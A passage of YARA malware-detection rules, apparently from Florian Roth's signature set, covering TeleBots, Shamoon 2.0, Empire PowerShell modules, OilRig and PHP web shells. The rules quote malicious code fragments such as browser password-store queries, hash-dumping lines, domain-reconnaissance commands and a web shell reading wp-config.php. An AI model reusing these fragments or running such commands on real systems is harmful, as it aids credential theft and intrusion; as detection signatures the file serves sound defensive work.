      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "26173c9ec8fd1c4f9f18f89683b23267f6f9d116196ed15655e9cb453af2890e"
      tags = "APT, DEMO, EXE, FILE, G0034"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Plug-And-Play Support Service" fullword wide
      $s2 = " /c \"echo Y|" fullword wide
      $s3 = "%d.%d.%d#%d:%d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
}

rule TeleBots_CredRaptor_Password_Stealer_RID3569 : APT DEMO EXE FILE G0034 T1003 credraptor {
   meta:
      description = "Detects TeleBots malware - CredRaptor Password Stealer"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
      date = "2016-12-14 16:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "50b990f6555055a265fde98324759dbc74619d6a7c49b9fd786775299bf77d26"
      tags = "APT, DEMO, EXE, FILE, G0034, T1003, credraptor"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "C:\\Documents and Settings\\Administrator\\Desktop\\GetPAI\\Out\\IE.pdb" fullword ascii
      $s2 = "SELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins" fullword ascii
      $s3 = "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS" fullword ascii
      $s4 = ".\\PAI\\IEforXPpasswords.txt" ascii
      $s5 = "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" ascii
      $s6 = "Opera old version credentials" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them ) or ( 4 of them )
}

rule Shamoon2_ComComp_RID2D25 : APT DEMO EXE FILE MIDDLE_EAST T1083 {
   meta:
      description = "Detects Shamoon 2.0 Communication Components"
      author = "Florian Roth"
      reference = "https://www.paloaltonetworks.com/blog/2016/11/unit42-shamoon-2-return-disttrack-wiper/"
      date = "2016-12-01 10:19:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842"
      tags = "APT, DEMO, EXE, FILE, MIDDLE_EAST, T1083"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "mkdir %s%s > nul 2>&1" fullword ascii
      $s2 = "p[%s%s%d.%s" fullword ascii
      $op1 = { 04 32 cb 88 04 37 88 4c 37 01 88 54 37 02 83 c6 } 
      $op2 = { c8 02 d2 c0 e9 06 02 d2 24 3f 02 d1 88 45 fb 8d } 
      $op3 = { 0c 3b 40 8d 4e 01 47 3b c1 7c d8 83 fe 03 7d 1c } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( all of ( $s* ) or all of ( $op* ) )
}

rule EldoS_RawDisk_RID2BFC : APT DEMO EXE FILE MIDDLE_EAST {
   meta:
      description = "EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)"
      author = "Florian Roth"
      reference = "https://www.paloaltonetworks.com/blog/2016/11/unit42-shamoon-2-return-disttrack-wiper/"
      date = "2016-12-01 09:29:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34"
      hash2 = "394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b"
      tags = "APT, DEMO, EXE, FILE, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "g\\system32\\" wide
      $s2 = "ztvttw" fullword wide
      $s3 = "lwizvm" fullword ascii
      $s4 = "FEJIKC" fullword ascii
      $s5 = "INZQND" fullword ascii
      $s6 = "IUTLOM" fullword wide
      $s7 = "DKFKCK" fullword ascii
      $op1 = { 94 35 77 73 03 40 eb e9 } 
      $op2 = { 80 7c 41 01 00 74 0a 3d } 
      $op3 = { 74 0a 3d 00 94 35 77 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 4 of them )
}

rule Empire_Exploit_Jenkins_RID2FE8 : DEMO EXPLOIT SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Exploit-Jenkins.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a5182cccd82bb9984b804b365e07baba78344108f225b94bd12a59081f680729"
      tags = "DEMO, EXPLOIT, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$postdata=\"script=println+new+ProcessBuilder%28%27\"+$($Cmd)+\"" ascii
      $s2 = "$url = \"http://\"+$($Rhost)+\":\"+$($Port)+\"/script\"" fullword ascii
      $s3 = "$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6620 and filesize < 7KB and 1 of them ) or all of them
}

rule Empire_Get_SecurityPackages_RID31C8 : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Get-SecurityPackages.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:37:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5d06e99121cff9b0fce74b71a137501452eebbcd1e901b26bde858313ee5a9c1"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)" fullword ascii
      $s2 = "$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
}

rule Empire_Invoke_PowerDump_RID3040 : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Invoke-PowerDump.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "095c5cf5c0c8a9f9b1083302e2ba1d4e112a410e186670f9b089081113f5e0e1"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $x16 = "$enc = Get-PostHashdumpScript" fullword ascii
      $x19 = "$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;" fullword ascii
      $x20 = "$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2023 and filesize < 60KB and 1 of them ) or all of them
}

rule Empire_Invoke_ShellcodeMSIL_RID3165 : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Invoke-ShellcodeMSIL.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9a9c6c9eb67bde4a8ce2c0858e353e19627b17ee2a7215fa04a19010d3ef153f"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$FinalShellcode.Length" fullword ascii
      $s2 = "@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)" fullword ascii
      $s3 = "@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57," fullword ascii
      $s4 = "$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}

rule Empire_Get_GPPPassword_RID2F8B : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Get-GPPPassword.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:01:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "55a4519c4f243148a971e4860225532a7ce730b3045bde3928303983ebcc38b0"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$Base64Decoded = [Convert]::FromBase64String($Cpassword)" fullword ascii
      $s2 = "$XMlFiles += Get-ChildItem -Path \"\\\\$DomainController\\SYSVOL\" -Recurse" ascii
      $s3 = "function Get-DecryptedCpassword {" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}

rule Empire_Invoke_SmbScanner_RID3089 : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Invoke-SmbScanner.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:44:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9a705f30766279d1e91273cfb1ce7156699177a109908e9a986cc2d38a7ab1dd"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$up = Test-Connection -count 1 -Quiet -ComputerName $Computer " fullword ascii
      $s2 = "$out | add-member Noteproperty 'Password' $Password" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}

rule Empire_Invoke_EgressCheck_RID30E4 : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Invoke-EgressCheck.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e2d270266abe03cfdac66e6fc0598c715e48d6d335adf09a9ed2626445636534"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "egress -ip $ip -port $c -delay $delay -protocol $protocol" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x233c and filesize < 10KB and 1 of them ) or all of them
}

rule Empire_Out_Minidump_RID2EAC : DEMO SCRIPT T1003_001 T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Out-Minidump.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7803ae7ba5d4e7d38e73745b3f321c2ca714f3141699d984322fa92e0ff037a1"
      tags = "DEMO, SCRIPT, T1003_001, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle," fullword ascii
      $s2 = "$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}

rule Empire_Invoke_PostExfil_RID303B : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Invoke-PostExfil.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "00c0479f83c3dbbeff42f4ab9b71ca5fe8cd5061cb37b7b6861c73c54fd96d3e"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "# upload to a specified exfil URI" fullword ascii
      $s2 = "Server path to exfil to." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x490a and filesize < 2KB and 1 of them ) or all of them
}

rule Empire_Invoke_SMBAutoBrute_RID311A : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Invoke-SMBAutoBrute.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7950f8abdd8ee09ed168137ef5380047d9d767a7172316070acc33b662f812b2"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[*] PDC: LAB-2008-DC1.lab.com" fullword ascii
      $s2 = "$attempts = Get-UserBadPwdCount $userid $dcs" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}

rule Empire_KeePassConfig_RID2ED4 : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file KeePassConfig.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:31:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
}

rule Empire_Invoke_SSHCommand_RID304A : DEMO SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - file Invoke-SSHCommand.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:33:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cbaf086b14d5bb6a756cbda42943d4d7ef97f8277164ce1f7dd0a1843e9aa242"
      tags = "DEMO, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA" ascii
      $s2 = "Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \"id\"" fullword ascii
      $s3 = "Write-Verbose \"[*] Error loading dll\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x660a and filesize < 2000KB and 1 of them ) or all of them
}

rule Empire_Agent_Gen_RID2D3A : DEMO GEN SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - from files agent.ps1, agent.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 10:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db"
      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$wc.Headers.Add(\"User-Agent\",$script:UserAgent)" fullword ascii
      $s2 = "$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)" fullword ascii
      $s3 = "if ($script:AgentDelay -ne 0){" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x660a and filesize < 100KB and 1 of them ) or all of them
}

rule Empire_Invoke_InveighRelay_Gen_RID32DD : DEMO GEN SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 14:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash2 = "21b90762150f804485219ad36fa509aeda210d46453307a9761c816040312f41"
      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$inveigh.SMBRelay_failed_list.Add(\"$HTTP_NTLM_domain_string\\$HTTP_NTLM_user_string $SMBRelayTarget\")" fullword ascii
      $s2 = "$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 200KB and 1 of them ) or all of them
}

rule Empire_KeePassConfig_Gen_RID304D : DEMO GEN SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash2 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
}

rule Empire_Invoke_Portscan_Gen_RID3160 : DEMO GEN SCRIPT T1059 T1059_001 {
   meta:
      description = "Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash2 = "cf7030be01fab47e79e4afc9e0d4857479b06a5f68654717f3bc1bc67a0f38d3"
      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Test-Port -h $h -p $Port -timeout $Timeout" fullword ascii
      $s2 = "1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 100KB and 1 of them ) or all of them
}

rule PassCV_Sabre_Malware_Signing_Cert_RID33D0 : APT DEMO EXE FILE {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 15:03:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7c32885c258a6d5be37ebe83643f00165da3ebf963471503909781540204752e"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "WOODTALE TECHNOLOGY INC" ascii
      $s2 = "Flyingbird Technology Limited" ascii
      $s3 = "Neoact Co., Ltd." ascii
      $s4 = "AmazGame Age Internet Technology Co., Ltd" ascii
      $s5 = "EMG Technology Limited" ascii
      $s6 = "Zemi Interactive Co., Ltd" ascii
      $s7 = "337 Technology Limited" ascii
      $s8 = "Runewaker Entertainment0" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )
}

rule PassCV_Sabre_Malware_4_RID2F48 : APT DEMO EXE FILE {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 11:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "27463bcb4301f0fdd95bc10bf67f9049e161a4e51425dac87949387c54c9167f"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "QWNjZXB0On" fullword ascii
      $s2 = "VXNlci1BZ2VudDogT" fullword ascii
      $s3 = "dGFzay5kbnME3luLmN" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule OilRig_Malware_Campaign_Gen3_RID31AA : DEMO FILE G0049 MAL MIDDLE_EAST {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/"
      date = "2016-10-12 13:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "5e9ddb25bde3719c392d08c13a295db418d7accd25d82d020b425052e7ba6dc9"
      hash2 = "bd0920c8836541f58e0778b4b64527e5a5f2084405f73ee33110f7bc189da7a9"
      hash3 = "90639c7423a329e304087428a01662cc06e2e9153299e37b1b1c90f6d0a195ed"
      tags = "DEMO, FILE, G0049, MAL, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr" fullword ascii
      $x2 = "\\Libraries\\fireueye.vbs" ascii
      $x3 = "\\Libraries\\fireeye.vbs&" wide
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 100KB and 1 of them )
}

rule OilRig_Campaign_Reconnaissance_RID32E1 : DEMO G0049 MAL MIDDLE_EAST T1016 T1033 T1087_002 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/"
      date = "2016-10-12 14:24:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "5893eae26df8e15c1e0fa763bf88a1ae79484cdb488ba2fc382700ff2cfab80c"
      tags = "DEMO, G0049, MAL, MIDDLE_EAST, T1016, T1033, T1087_002"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "whoami & hostname & ipconfig /all" ascii
      $s2 = "net user /domain 2>&1 & net group /domain 2>&1" ascii
      $s3 = "net group \"domain admins\" /domain 2>&1 & " ascii
   condition: 
      ( filesize < 1KB and 1 of them )
}

rule OilRig_Malware_Campaign_Mal3_RID31AA : DEMO G0049 MAL MIDDLE_EAST {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/"
      date = "2016-10-12 13:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "02226181f27dbf59af5377e39cf583db15200100eea712fcb6f55c0a2245a378"
      tags = "DEMO, G0049, MAL, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "(Get-Content $env:Public\\Libraries\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\Libraries\\dns.ps1" fullword ascii
      $x2 = "Invoke-Expression ($global:myhome+'tp\\'+$global:filename+'.bat > '+$global:myhome+'tp\\'+$global:filename+'.txt')" fullword ascii
      $x3 = "('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))" fullword ascii
   condition: 
      ( filesize < 10KB and 1 of them )
}

rule Sality_Malware_Oct16_RID2E9B : DEMO EXE FILE MAL Sality {
   meta:
      description = "Detects an unspecififed malware - October 2016"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 11:21:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8eaff5e1d4b55dd6e25f007549271da10afd1fa25064d7105de0ca2735487aad"
      tags = "DEMO, EXE, FILE, MAL, Sality"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Hello world!" fullword wide
      $s2 = "[LordPE]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule Bladabindi_Malware_B64_RID2F1E : DEMO EXE FILE MAL T1132_001 {
   meta:
      description = "Detects Bladabindi Malware using Base64 encoded strings"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 11:43:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dda668b0792b7679979e61f2038cf9a8ec39415cc161be00d2c8301e7d48768d"
      tags = "DEMO, EXE, FILE, MAL, T1132_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "XHN5c3RlbTMyXA==" fullword ascii
      $s2 = "RXhlY3V0ZSBFUlJPUg==" fullword ascii
      $s3 = "dHJvamFuLmV4ZQ==" fullword ascii
      $s4 = "VXBkYXRlIEVSUk9S" fullword ascii
      $s5 = "RG93bmxvYWQgRVJST1I=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them
}

rule Dorkbot_Injector_Malware_RID30AB : DEMO EXE FILE MAL {
   meta:
      description = "Detects Darkbot Injector"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 12:49:41"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bc3c5ac7180c8ac21d6908d747aa6122154d2bb51bb99ff0e0b1c65088d275dc"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Enter an integer, a real number, a character and a string : " fullword ascii
      $s2 = "ready to finish" fullword ascii
      $s3 = "EYEnpw" fullword ascii
      $s4 = "somewhere i belong" fullword ascii
      $s5 = "Not all fields were assigned" fullword ascii
      $s6 = "take down" fullword ascii
      $s7 = "real number = %f" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 6 of them )
}

rule Unspecified_Malware_Oct16_E_RID3138 : DEMO EXE FILE MAL {
   meta:
      description = "Detects unspecified Malware - October 2016"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 13:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "28093385130b61f22920c0ce6e56de1f2cd8eef589bebe2af31f36f51f2b4d01"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "P3pORt" fullword ascii
      $s2 = "msdownld.tmp" fullword ascii
      $s3 = "TMP4351$.TMP" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
}

rule UploadShell_98038f1efa4203432349badabad76d44337319a6_RID3657 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "506a6ab6c49e904b4adc1f969c91e4f1a7dde164be549c6440e766de36c93215"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
      $s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
      $s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )
}

rule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3_RID3552 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7ea49d5c29f1242f81f2393b514798ff7caccb50d46c60bdfcf61db00043473b"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
      $s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
   condition: 
      ( uint16 ( 0 ) == 0x3c0a and filesize < 300KB and all of them )
}

rule Unknown_8af033424f9590a15472a23cc3236e68070b952e_RID345B : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 15:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3382b5eaaa9ad651ab4793e807032650667f9d64356676a16ae3e9b02740ccf3"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
      $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
      $s3 = "fwrite($fp,base64_decode('" ascii
   condition: 
